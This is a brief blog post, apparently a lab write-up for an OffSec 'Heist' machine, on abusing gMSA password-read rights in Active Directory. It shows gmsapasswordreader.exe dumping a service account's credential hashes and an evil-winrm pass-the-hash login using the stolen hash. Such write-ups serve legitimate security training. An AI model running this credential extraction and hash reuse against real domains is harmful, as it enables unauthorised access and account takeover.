+++
date = '2026-04-18T14:23:37+09:00'
draft = false
title = 'AD Gmsapassword'
+++

# GMSAPassword

When a user has adGMSAPassword permission over a target account, it is possible to retrieve the managed password and derive usable credentials for authentication.

# Abuse workflow

1. Identify GMSA permissions

If your account has adGMSAPassword rights over a Group Managed Service Account (gMSA), you can extract its password material.

![gmsa](/images/heist/privesc-1.png)

2. Prepare the extraction tool

Use a tool such as gmsapasswordreader.exe to retrieve the password data.

Transfer the binary to the target machine (in this case, enox) and execute it:

```powershell
gmsapasswordreader.exe --accountname svc_apache

Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : B4A3125F0CB30FCBB499D4B4EB1C20D2
[*]       aes128_cts_hmac_sha1 : 51943C933F7A24126B1C43883866DDB4
[*]       aes256_cts_hmac_sha1 : 003367B7C9B89B1717838E9CE2B79C0CD458326E32870F73EC94AF810F4A7E32
[*]       des_cbc_md5          : 45C4D9732C9D1FD5

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 037AE0A6176EB04FD4C7AECEB0C4327E
[*]       aes128_cts_hmac_sha1 : 4CBAA41110A1C11A787B3B007511BE64
[*]       aes256_cts_hmac_sha1 : 337BDE8B0B552127E854D423A2B5293DC6091F71C5D76E373341959882AFFFE8
[*]       des_cbc_md5          : 7964FE5D51E5869D
```

3. Authenticate using the retrieved hash

With the extracted NTLM (RC4) hash, authenticate as the gMSA account:

```bash
evil-winrm -i 192.168.134.165 -u svc_apache$ -H 037AE0A6176EB04FD4C7AECEB0C4327E
```